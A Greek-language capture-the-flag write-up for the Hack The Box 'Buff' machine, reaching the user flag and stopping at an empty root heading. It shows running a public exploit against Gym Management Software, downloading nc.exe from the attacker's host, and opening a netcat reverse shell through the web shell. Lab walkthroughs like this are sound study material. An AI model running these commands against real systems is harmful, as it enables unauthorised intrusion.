## [HTB] Hackthebox Buff machine writeup by dhmosfunk



![buff](https://github.com/p19tzam/photos/blob/main/hackthebox-writeups-photos/buff.png?raw=true)<br>

[1.User flag]()

[2.Root flag]()




#### 1.User flag
- [x] MACHINE IP: 10.10.10.198 <br> <br>
Πρώτα απ όλα ξεκινάμε με ένα nmap scan για να δούμε τι ports τρέχουν στην IP. <br>
```nmap -sV -sC -oA nmap/buff 10.10.10.198```
![buff](https://github.com/p19tzam/photos/blob/main/hackthebox-writeups-photos/nmap%20scan.png?raw=true)

Όπως βλέπουμε στο scan μας τρέχει ενας webserver στο port 8080.
Ανοίγοντας το site στον browser και πηγαίνοντας στο contact.php θα βρούμε το software που τρέχει στον server(Που επίσης είναι outdated).

![outdatedsoftware](https://github.com/p19tzam/photos/blob/main/hackthebox-writeups-photos/gymanagement.png?raw=true)

Με ενα google search βρίσκουμε το συγκεκριμένο exploit: [Gym Management Software 1.0 exploit](https://www.exploit-db.com/exploits/48506)

Το κάνουμε download και το τρέχουμε όπως δείχνω στην εικόνα

```python 48506.py http://10.10.10.198:8080/```
![exploit](https://github.com/p19tzam/photos/blob/main/hackthebox-writeups-photos/shell.png?raw=true)

Και έχουμε shell!

Τώρα θέλουμε να κάνουμε ενα [reverse shell](https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/) που θα το κάνουμε με το netcat.

Πρώτα απο όλα πρέπει να βρούμε το netcat.exe και να το κάνουμε upload στο buff machine

![nc](https://github.com/p19tzam/photos/blob/main/hackthebox-writeups-photos/nc.png?raw=true)

Μόλις βρούμε το netcat.exe δημιουργούμε ενα simplehttpserver με την python για να το “τραβήξουμε” στο buff machine <br>
```python -m SimpleHTTPServer 9003 ```
![simplehttpserver](https://github.com/p19tzam/photos/blob/main/hackthebox-writeups-photos/httpserver.png?raw=true)


Για να “τραβήξουμε” το nc.exe θα πρέπει να χρησιμοποιήσουμε το ‘wget’ όπως δείχνω παρακάτω <br>
```powershell wget http://10.10.14.41:9009/nc.exe```
![uploadnc](https://github.com/p19tzam/photos/blob/main/hackthebox-writeups-photos/uploadnc.png)


Ωραία μέχρι εδω..
Τώρα reverse shell.. Δημιουργούμε ενα listener στο kali machine
```nc -lvvnp 9003```
![nclistener](https://github.com/p19tzam/photos/blob/main/hackthebox-writeups-photos/nc%20listen.png?raw=true)

Μόλις βάλουμε τον listener θα πρέπει να πάμε στον browser να τρέξουμε το command:<br>
```10.10.10.198:8080/upload/kamehameha.php?telepathy=nc.exe 10.10.14.41 9003 -e cmd.exe```
![browservs](https://github.com/p19tzam/photos/blob/main/hackthebox-writeups-photos/browser%20reverse%20shell.png?raw=true)
<br>
<br>Και μετα βρίσκουμε το user.txt
![userflag](https://github.com/p19tzam/photos/blob/main/hackthebox-writeups-photos/userflag.png?raw=true)

![userflag2](https://github.com/p19tzam/photos/blob/main/hackthebox-writeups-photos/userflagtxt.png?raw=true)

Και πάμε για το root!








#### 2.Root flag
